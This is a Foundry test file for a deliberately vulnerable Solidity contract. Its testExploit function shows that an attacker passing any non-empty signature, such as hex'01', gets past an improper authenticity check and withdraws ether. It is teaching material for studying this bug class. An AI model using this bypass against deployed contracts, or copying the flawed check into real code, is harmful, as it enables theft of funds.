pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/8.3.3-Improper-authenticity-check-vulnerability.sol";

contract VulnerableAuthTest is Test {
    VulnerableAuth vulnerable;
    // Define an attacker address
    address attacker = address(0x100);

    // setUp is called before each test
    function setUp() public {
        // Deploy the vulnerable contract
        vulnerable = new VulnerableAuth();

        // Fund the contract with 10 ether via the receive() fallback
        (bool success, ) = address(vulnerable).call{value: 10 ether}("");
        require(success, "Failed to fund the contract");

        // Ensure that attacker has some balance if needed for transaction fees
        vm.deal(attacker, 1 ether);
    }

    // Test that calling execute with an empty signature reverts
    function testExecuteFailsWithEmptySignature() public {
        vm.prank(attacker);
        vm.expectRevert("Signature required");
        vulnerable.execute(1 ether, "");
    }

    // Test the exploit: using any non-empty signature (e.g., 0x01) allows attacker to extract funds
    function testExploit() public {
        uint256 amount = 1 ether;

        // Record initial balances
        uint256 initialAttackerBalance = attacker.balance;
        uint256 initialContractBalance = address(vulnerable).balance;

        // Attacker calls execute with an arbitrary non-empty signature to bypass authenticity check
        vm.prank(attacker);
        vulnerable.execute(amount, hex"01");

        // Verify that attacker's balance increased by the withdrawn amount
        assertEq(attacker.balance, initialAttackerBalance + amount, "Attacker did not receive the expected Ether");

        // Verify that the contract's balance decreased accordingly
        assertEq(address(vulnerable).balance, initialContractBalance - amount, "Ether was not deducted from the contract");
    }

    // To allow the contract to receive Ether from the call in setUp
    receive() external payable {}
}
